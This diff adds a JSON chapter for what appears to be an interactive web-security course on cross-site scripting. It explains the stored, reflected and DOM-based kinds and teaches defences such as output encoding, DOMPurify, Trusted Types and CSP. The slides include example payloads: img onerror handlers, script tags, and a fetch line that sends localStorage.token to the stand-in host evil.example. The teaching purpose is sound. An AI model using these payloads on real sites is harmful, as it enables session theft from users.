@@ -1,0 +1,275 @@
+{
+  "$schema": "../../schema/chapter.schema.json",
+  "id": "xss",
+  "name": "Cross-site scripting (XSS)",
+  "slides": [
+    {
+      "title": "What XSS is",
+      "summary": "XSS happens when attacker-controlled data ends up running as code in your page, with all of your origin's power.",
+      "body": [
+        "<b>Cross-site scripting</b> is the most common frontend vulnerability. The attacker gets the browser to treat their text as HTML or JavaScript inside your page.",
+        "Once their script runs, it <i>is</i> your app as far as the browser is concerned. It can:",
+        {
+          "ul": [
+            "read the page, including personal data and CSRF tokens;",
+            "read <code>localStorage</code> and any token you keep there;",
+            "make authenticated requests as the user (change email, transfer money);",
+            "rewrite the page to show a fake login form."
+          ]
+        },
+        "<mark>Any place where data becomes markup or code is a possible XSS sink.</mark>"
+      ],
+      "viz": [
+        {
+          "type": "stepper",
+          "accumulate": true,
+          "nextLabel": "Next step",
+          "steps": [
+            {
+              "item": {
+                "label": "<b>Attacker posts a comment</b>",
+                "sub": "Nice post! &lt;img src=x onerror=\"steal()\"&gt;",
+                "tone": "muted"
+              },
+              "caption": "The payload is stored as ordinary text."
+            },
+            {
+              "item": {
+                "label": "<b>App renders it as HTML</b>",
+                "sub": "el.innerHTML = comment.text",
+                "tone": "heat",
+                "mono": true
+              },
+              "caption": "The developer used innerHTML to support bold text."
+            },
+            {
+              "item": {
+                "label": "<b>Browser runs onerror</b>",
+                "sub": "steal() runs in your origin",
+                "tone": "neg"
+              },
+              "caption": "The image fails to load, so its error handler runs."
+            },
+            {
+              "item": {
+                "label": "<b>Session stolen</b>",
+                "sub": "fetch('https://evil.example?t=' + localStorage.token)",
+                "tone": "neg",
+                "mono": true
+              },
+              "caption": "Every reader of the comment is now compromised."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "Three kinds of XSS",
+      "summary": "Stored, reflected and DOM-based XSS differ in where the payload lives, but the fix is the same: never let data become code.",
+      "body": [
+        {
+          "ul": [
+            "<b>Stored:</b> the payload is saved in your database (a comment, a profile name) and served to every viewer.",
+            "<b>Reflected:</b> the payload is in the request, usually the URL, and the server echoes it back into the page.",
+            "<b>DOM-based:</b> the payload never reaches the server. Client code reads it from <code>location</code>, <code>postMessage</code> or storage and writes it into the DOM."
+          ]
+        },
+        "Single-page apps mostly face <b>DOM-based</b> XSS, because the client does the rendering.",
+        {
+          "note": "Server-side scanners often can't see DOM XSS, because the dangerous flow happens entirely in the browser.",
+          "kind": "warn"
+        }
+      ],
+      "viz": [
+        {
+          "type": "tabs",
+          "tabs": [
+            {
+              "label": "Stored",
+              "blocks": [
+                {
+                  "type": "code",
+                  "title": "Profile name saved in the DB",
+                  "source": [
+                    "name = '<script>steal()</script>'",
+                    "// rendered for every visitor:",
+                    "<h2>${name}</h2>"
+                  ]
+                }
+              ]
+            },
+            {
+              "label": "Reflected",
+              "blocks": [
+                {
+                  "type": "code",
+                  "title": "Search page echoes the query",
+                  "source": [
+                    "https://shop.example/search?q=<script>steal()</script>",
+                    "// server: `Results for ${q}`"
+                  ]
+                }
+              ]
+            },
+            {
+              "label": "DOM-based",
+              "blocks": [
+                {
+                  "type": "code",
+                  "title": "Client reads the hash",
+                  "source": [
+                    "const tab = decodeURIComponent(location.hash.slice(1));",
+                    "tabs.innerHTML = `<b>${tab}</b>`;",
+                    "// https://app.example/#<img src=x onerror=steal()>"
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "Encode for the context",
+      "summary": "The right escaping depends on where the data lands: HTML text, an attribute, a URL or a script.",
+      "body": [
+        "The main defence is <b>output encoding</b>: turn special characters into harmless text <i>for the context the data is written into</i>.",
+        {
+          "ul": [
+            "<b>HTML text:</b> escape <code>&lt; &gt; &amp; \" '</code>. Use <code>textContent</code> rather than <code>innerHTML</code>.",
+            "<b>Attributes:</b> always quote them and escape quotes; never build event-handler attributes from data.",
+            "<b>URLs:</b> allow only <code>https:</code>, <code>http:</code> and <code>mailto:</code>. A <code>javascript:</code> URL in an <code>href</code> runs code on click.",
+            "<b>Inside &lt;script&gt;:</b> don't. Pass data with <code>JSON</code> in a data attribute or a <code>type=\"application/json\"</code> block."
+          ]
+        },
+        "<mark>Frameworks escape text bindings for you. XSS in modern apps almost always comes through an escape hatch.</mark>"
+      ],
+      "viz": [
+        {
+          "type": "table",
+          "rows": [
+            {
+              "head": "Framework",
+              "cells": [
+                {
+                  "text": "Safe by default"
+                },
+                {
+                  "text": "Escape hatch to review"
+                }
+              ]
+            },
+            {
+              "head": "Angular",
+              "cells": [
+                {
+                  "text": "{{ }} and [property] bindings; [innerHTML] is sanitized"
+                },
+                {
+                  "text": "bypassSecurityTrustHtml / Url / Script"
+                }
+              ]
+            },
+            {
+              "head": "React",
+              "cells": [
+                {
+                  "text": "{value} in JSX"
+                },
+                {
+                  "text": "dangerouslySetInnerHTML, href from user data"
+                }
+              ]
+            },
+            {
+              "head": "Vue",
+              "cells": [
+                {
+                  "text": "{{ }} interpolation"
+                },
+                {
+                  "text": "v-html"
+                }
+              ]
+            },
+            {
+              "head": "Plain DOM",
+              "cells": [
+                {
+                  "text": "textContent, setAttribute on safe attributes"
+                },
+                {
+                  "text": "innerHTML, outerHTML, insertAdjacentHTML, document.write, eval"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "caption",
+          "html": "Search your codebase for the right-hand column. Each hit needs a reason and a review."
+        }
+      ]
+    },
+    {
+      "title": "When you must render HTML",
+      "summary": "Sanitize with a maintained library, then lock the sinks down with Trusted Types and a CSP.",
+      "body": [
+        "Rich text editors, Markdown and CMS content need real HTML. Don't write your own filter: regex-based blocklists are bypassed all the time.",
+        {
+          "ul": [
+            "<b>Sanitize</b> with a maintained library such as DOMPurify, or Angular's built-in sanitizer, using an allowlist of tags and attributes.",
+            "<b>Sanitize as late as possible</b>, just before rendering, so nothing changes the HTML afterwards.",
+            "<b>Turn on Trusted Types</b> so the browser rejects plain strings passed to <code>innerHTML</code> and other sinks.",
+            "<b>Add a strict CSP</b> so that even if a payload gets through, inline scripts don't run."
+          ]
+        },
+        {
+          "more": "What is Trusted Types?",
+          "text": "A CSP feature: with <code>require-trusted-types-for 'script'</code>, DOM sinks only accept typed objects created by a policy you define. Every risky write then goes through one reviewed function. Angular supports it out of the box.",
+          "goto": {
+            "chapter": "security-headers",
+            "slide": 2
+          },
+          "link": "CSP in Security headers"
+        }
+      ],
+      "code": [
+        "import DOMPurify from 'dompurify';",
+        "",
+        "const clean = DOMPurify.sanitize(userHtml, {",
+        "  ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'],",
+        "  ALLOWED_ATTR: ['href'],",
+        "});",
+        "preview.innerHTML = clean;"
+      ],
+      "viz": [
+        {
+          "type": "stages",
+          "items": [
+            {
+              "label": "<b>1. Encode</b>",
+              "sub": "Text stays text",
+              "tone": "pos"
+            },
+            {
+              "label": "<b>2. Sanitize</b>",
+              "sub": "When HTML is unavoidable",
+              "tone": "accent"
+            },
+            {
+              "label": "<b>3. Trusted Types</b>",
+              "sub": "Only reviewed code reaches sinks",
+              "tone": "accent"
+            },
+            {
+              "label": "<b>4. CSP</b>",
+              "sub": "Injected scripts don't run",
+              "tone": "heat"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
